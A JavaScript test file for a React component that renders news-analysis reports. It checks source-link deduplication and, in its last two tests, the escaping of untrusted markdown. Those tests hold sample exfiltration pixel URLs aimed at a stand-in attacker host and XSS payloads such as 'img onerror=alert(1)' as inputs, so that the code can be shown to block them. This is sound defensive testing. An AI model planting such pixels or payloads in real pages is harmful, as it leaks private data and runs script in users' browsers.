import assert from 'node:assert/strict'
import { mkdtemp, rm } from 'node:fs/promises'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import { fileURLToPath } from 'node:url'
import { after, before, test } from 'node:test'
import { Children, createElement, isValidElement } from 'react'
import { renderToStaticMarkup } from 'react-dom/server'
import { createServer } from 'vite'

let server, emptyEnvDir, ReportReadingContent
before(async () => {
  emptyEnvDir = await mkdtemp(join(tmpdir(), 'report-reading-sources-test-'))
  server = await createServer({ root: fileURLToPath(new URL('../', import.meta.url)), configFile: false,
    envDir: emptyEnvDir, cacheDir: join(emptyEnvDir, 'vite-cache'),
    optimizeDeps: { noDiscovery: true, include: [] },
    server: { middlewareMode: true, watch: null, ws: false }, logLevel: 'error' })
  ReportReadingContent = (await server.ssrLoadModule('/src/features/reports/ReportReadingContent.tsx')).ReportReadingContent
})
after(async () => {
  await server?.close()
  if (emptyEnvDir) await rm(emptyEnvDir, { recursive: true, force: true, maxRetries: 5, retryDelay: 100 })
})

function reportWithSources(findings, eventSources, watchSources = []) {
  return {
    markdownBody: '', findings,
    structuredContent: {
      executiveSummary: [], sourceNotes: [],
      importantEvents: [{ title: '중요 이벤트', summaryKo: '이벤트 요약', significance: null, sourceFindingIds: eventSources }],
      watchItems: watchSources.length ? [{ topic: '관찰 주제', reason: '관찰 이유', sourceFindingIds: watchSources }] : [],
    },
  }
}

function finding(id, articleId = 10, runId = 42, articleTitle = '같은 기사 제목') {
  return { id, articleId, runId, articleTitle, issueId: id, keyPoints: [] }
}

function sourceButtons(element) {
  if (!isValidElement(element)) return []
  if (element.type === 'button' && element.props.className === 'text-button') return [element]
  return Children.toArray(element.props.children).flatMap(sourceButtons)
}

test('repeated finding IDs and topic findings render one article source in each event and watch item', () => {
  for (const ids of [[1, 1, 1], [1, 2, 3]]) {
    const report = reportWithSources([finding(1), finding(2), finding(3)], ids, ids.toReversed())
    const html = renderToStaticMarkup(createElement(ReportReadingContent, { report, onEvidenceSelect() {} }))
    const sourceLists = [...html.matchAll(/<div class="report-event-sources">(.*?)<\/div>/g)]
    assert.equal(sourceLists.length, 2)
    for (const [, sources] of sourceLists) {
      assert.equal((sources.match(/<button /g) ?? []).length, 1)
      assert.match(sources, /같은 기사 제목/)
    }
  }
})

test('same-title articles stay distinct while repeated and missing finding references do not add links', () => {
  const report = reportWithSources([finding(1), finding(2, 20), finding(3)], [999, 2, 1, 1, 3])
  const selections = []
  const tree = ReportReadingContent({ report, onEvidenceSelect: (...args) => selections.push(args) })
  const buttons = sourceButtons(tree)
  assert.equal(buttons.length, 2)
  buttons.forEach(button => button.props.onClick())
  assert.deepEqual(selections, [[20, 42, []], [10, 42, []]])
  const html = renderToStaticMarkup(tree)
  assert.equal((html.match(/같은 기사 제목/g) ?? []).length, 2)
})

test('daily sources keep the first cited run snapshot independently for each report item', () => {
  const report = reportWithSources([finding(1, 10, 42), finding(2, 10, 43)], [2, 1], [1, 2])
  const selections = []
  const buttons = sourceButtons(ReportReadingContent({ report, onEvidenceSelect: (...args) => selections.push(args) }))
  assert.equal(buttons.length, 2)
  buttons.forEach(button => button.props.onClick())
  assert.deepEqual(selections, [[10, 43, []], [10, 42, []]])
})

test('legacy report images display their labels without creating browser resource requests', () => {
  for (const url of [
    'https://attacker.invalid/pixel?report=private-summary',
    'http://attacker.invalid/pixel.svg',
    '//attacker.invalid/pixel',
    '/api/news/reports/latest',
    'data:image/svg+xml;base64,PHN2Zy8+',
    'data:image/png;base64,aGVsbG8=',
  ]) {
    const report = { id: 1, markdownBody: `본문\n\n![이미지 설명](${url})`, structuredContent: null }
    const html = renderToStaticMarkup(createElement(ReportReadingContent, { report, onEvidenceSelect() {} }))
    assert.match(html, /본문/)
    assert.match(html, /이미지 설명/)
    assert.doesNotMatch(html, /<(?:img|image|svg|iframe|link)\b/)
    assert.doesNotMatch(html, /attacker\.invalid|\/api\/news\/reports\/latest|data:image/)
  }
})

test('legacy report prose and explicit links remain usable while HTML stays escaped', () => {
  const report = { id: 1, structuredContent: null, markdownBody:
    '**분석 결과**\n\n[원문](https://example.invalid/article)\n\n![<img onerror=alert(1)>](https://attacker.invalid/pixel)\n\n<img src="https://attacker.invalid/html-pixel" onerror="alert(1)">' }
  const html = renderToStaticMarkup(createElement(ReportReadingContent, { report, onEvidenceSelect() {} }))
  assert.match(html, /<strong>분석 결과<\/strong>/)
  assert.match(html, /<a href="https:\/\/example\.invalid\/article" target="_blank" rel="noreferrer">원문<\/a>/)
  assert.match(html, /&lt;img onerror=alert\(1\)&gt;/)
  assert.doesNotMatch(html, /<(?:img|iframe|link|script)\b/)
})
